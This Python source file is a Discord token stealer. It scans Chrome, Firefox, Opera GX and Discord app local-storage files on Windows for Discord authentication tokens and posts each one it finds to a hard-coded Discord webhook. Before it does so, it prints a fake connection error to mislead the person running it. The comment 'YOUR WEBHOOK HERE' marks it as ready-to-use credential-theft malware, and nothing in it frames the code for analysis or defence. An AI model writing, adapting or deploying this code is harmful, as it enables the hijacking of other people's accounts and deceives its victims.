import os
import re
import requests
import sys

def send_to_webhook(embed, webhook_url):
    payload = {
        'embeds': [embed]
    }
    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            print("Embed message sent successfully.")
        else:
            print(f"Failed to send embed message. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while sending to webhook: {str(e)}")

def find_discord_token(webhook_url):
    paths = {
        'chrome': os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
        'firefox': os.path.expanduser('~') + r'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'discord_app': os.path.expanduser('~') + r'\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
        'opera_gx': os.path.expanduser('~') + r'\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Local Storage\\leveldb'
    }

    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')

    found_token = False

    for browser, path in paths.items():
        try:
            if os.path.exists(path):
                for filename in os.listdir(path):
                    if filename.endswith('.ldb') or filename.endswith('.log'):
                        with open(os.path.join(path, filename), 'r', errors='ignore') as file:
                            content = file.read()
                            tokens = token_pattern.findall(content)
                            if tokens:
                                for token in tokens:
                                    found_token = True
                                    embed = {
                                        'title': 'Discord Token Found',
                                        'description': f'Token found in {browser} storage.',
                                        'color': 15258703,
                                        'fields': [
                                            {
                                                'name': 'Token',
                                                'value': token,
                                                'inline': False
                                            },
                                            {
                                                'name': 'Browser/App',
                                                'value': browser,
                                                'inline': False
                                            }
                                        ]
                                    }
                                    send_to_webhook(embed, webhook_url)
                                    
        except Exception as e:
            print(f"An error occurred while searching in {browser}: {str(e)}")

    if found_token:
        print("Exiting.")
    else:
        print("No tokens found.")
    
    sys.exit()

def simulate_error():
    print("There is a problem with the connection. Please try again later.")

if __name__ == "__main__":
    simulate_error()

    webhook_url = 'https://discord.com/api/webhooks/1389228423028936705/81rOU8WuhcG2G1B2xZ9nJwPn-jKERdjRWGYLRe49_F02uXcqWTZlgSEvbzd2pCzlC1HO' # YOUR WEBHOOK HERE!!!!
    find_discord_token(webhook_url)
